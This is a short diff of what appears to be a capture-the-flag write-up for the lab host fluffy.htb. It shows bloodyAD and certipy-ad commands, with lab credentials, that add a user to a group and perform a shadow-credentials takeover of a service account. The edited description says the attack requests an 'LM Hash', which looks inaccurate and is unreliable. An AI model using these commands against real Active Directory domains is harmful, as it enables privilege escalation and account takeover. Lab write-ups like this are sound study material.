@@ -9,7 +9,7 @@ Adding current user to the group using "BloodyAD".
 bloodyad -u p.agila -p prometheusx-303 -d fluffy.htb -H 10.129.19.236 add groupmember 'service accounts' p.agila
 ```
 
-Abusing GenericWrite to an service account and requesting NTLM Hash.
+Performing Shadow Credential Attack (GenericWrite) to an service account and requesting LM Hash.
 
 ```
 certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p prometheusx-303 -account winrm_svc -dc-ip 10.129.19.236 -dc-host dc01.fluffy.htb
